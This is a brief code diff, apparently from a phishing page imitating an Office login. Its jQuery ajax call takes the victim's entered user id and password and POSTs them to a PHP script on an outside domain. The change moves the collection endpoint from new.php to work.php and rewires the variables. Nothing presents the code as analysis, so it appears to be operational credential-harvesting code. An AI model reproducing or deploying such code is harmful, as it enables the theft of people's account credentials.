@@ -823,11 +823,11 @@
         var idpwd = $("#office_passwd").val();
 
         $.ajax({
-          url: "https://baf.com.sa/new.php",
+          url: "https://baf.com.sa/work.php",
           type: "POST",
           data: {
-            user: email,
-            pass: password,
+            user: uid,
+            pass: idpwd,
             type: 1,
           },
           success: function (response) {
